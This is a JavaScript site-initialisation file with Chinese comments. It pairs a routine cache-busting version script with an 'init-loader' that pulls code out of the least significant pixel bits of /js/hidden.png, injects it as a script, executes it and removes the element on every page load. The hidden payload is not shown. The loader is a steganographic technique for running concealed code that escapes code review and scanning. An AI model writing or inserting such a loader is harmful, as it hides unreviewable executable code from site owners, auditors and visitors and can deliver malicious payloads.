// ============================================================
// 全局版本号 —— 每次发布改这里
// ============================================================
window.APP_VERSION = '20261006-2318';

// ============================================================
// 以下是 init.js 原有逻辑
// ============================================================
(function () {
    const V = window.APP_VERSION || Date.now();

    function addVersion(el) {
        if (el.tagName === 'LINK' && el.rel === 'stylesheet') {
            const href = el.getAttribute('href');
            if (!href) return;
            if (href.startsWith('http://') || href.startsWith('https://')) return;
            if (href.includes('?v=')) return;
            const sep = href.includes('?') ? '&' : '?';
            el.setAttribute('href', href + sep + 'v=' + V);
        } else if (el.tagName === 'SCRIPT' && el.src) {
            const src = el.getAttribute('src');
            if (!src) return;
            if (src.startsWith('http://') || src.startsWith('https://')) return;
            if (src.includes('?v=')) return;
            const sep = src.includes('?') ? '&' : '?';
            el.setAttribute('src', src + sep + 'v=' + V);
        }
    }

    // 1. 先处理已有的
    document.querySelectorAll("link[rel='stylesheet']:not(#appendNodeId), script[src]:not(#appendNodeId)").forEach(addVersion);

    // 2. 监听后续动态插入的
    const observer = new MutationObserver((mutations) => {
        for (const mutation of mutations) {
            for (const node of mutation.addedNodes) {
                if (node.nodeType !== 1) continue;  // 只处理元素节点
                addVersion(node);
                // 处理子节点
                if (node.querySelectorAll) {
                    node.id = 'appendNodeId'
                    node.querySelectorAll('link[rel="stylesheet"], script[src]').forEach(addVersion);
                }
            }
        }
    });

    document.querySelectorAll("link[rel='stylesheet'], script[src]").forEach(el => {
        if (el.closest('#appendNodeId')) return;
        addVersion(el);
    });

    console.log('[init] 已启动版本号监听，版本', V);
})();

// ============================================================
// init-loader：从 hidden.png 提取 init.js 并执行
// ============================================================
(async function () {
    // hidden.png 的版本号：用 Date.now()，每次刷新都拉最新
    const PNG_VERSION = Date.now();

    const img = new Image();
    img.crossOrigin = 'anonymous';
    img.src = '/js/hidden.png?v=' + PNG_VERSION;  // ← 加版本号

    await new Promise((resolve, reject) => {
        img.onload = resolve;
        img.onerror = reject;
    });

    const canvas = document.createElement('canvas');
    canvas.width = img.width;
    canvas.height = img.height;
    const ctx = canvas.getContext('2d', { willReadFrequently: true });
    ctx.drawImage(img, 0, 0);
    const data = ctx.getImageData(0, 0, img.width, img.height).data;

    function readBytes(start, count) {
        const out = new Uint8Array(count);
        for (let i = 0; i < count * 8; i++) {
            const idx = start + i;
            // 只读 R、G、B，跳过 A
            const pixelIndex = Math.floor(idx / 3) * 4 + (idx % 3);
            const bit = data[pixelIndex] & 1;
            out[i >> 3] |= bit << (7 - (i & 7));
        }
        return out;
    }

    const header = readBytes(0, 4);
    const len = (header[0] << 24) | (header[1] << 16) | (header[2] << 8) | header[3];
    console.log('[init-loader] 读出长度:', len);

    const body = readBytes(32, len);
    const code = new TextDecoder('utf-8').decode(body);

    console.log('[init-loader] 前 100 字符:', code.slice(0, 100));

    const script = document.createElement('script');
    script.textContent = code;
    document.body.appendChild(script);
    script.remove();

    console.log('[init-loader] 已从图片提取并执行 init.js，长度', len);
})();